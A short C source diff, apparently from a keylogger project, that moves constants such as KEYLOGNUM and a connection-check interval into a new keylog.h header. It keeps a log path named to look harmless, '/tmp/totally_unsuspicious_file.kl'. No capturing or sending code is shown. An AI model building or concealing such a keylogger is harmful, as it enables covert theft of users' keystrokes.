@@ -10,12 +10,7 @@
 #include "inet_utils.h"
 #include "x_utils.h"
 #include "file_utils.h"
-
-#define NIL (0)
-#define READLEN 1
-
-#define KEYLOGNUM 10
-#define CONCHECKINTV 5
+#include "keylog.h"
 
 // stuff
 char *filename = "/tmp/totally_unsuspicious_file.kl";
